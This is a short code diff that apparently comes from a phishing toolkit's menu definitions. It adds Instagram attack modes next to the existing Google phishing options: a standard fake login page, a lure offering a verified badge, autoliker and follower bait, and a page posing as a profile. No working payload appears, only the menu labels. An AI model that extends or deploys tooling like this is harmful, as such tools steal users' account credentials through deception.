@@ -42,6 +42,10 @@ lang_start_main_menu = {
     "google_operation_modes" :
     [ [_('{0}[{1}1{0}]{1} Standard Page Phishing'),                  _('{0}[{1}3{0}]{1} New Google Web')],
       [_('{0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)')]],
+    "instagram_operation_modes" :
+    [ [_('{0}[{1}1{0}]{1} Standard Instagram Web Page Phishing'),            _('{0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge)')],
+      [_('{0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)'), _('{0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers)')],
+      [_('{0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)')]],
 }
 
              
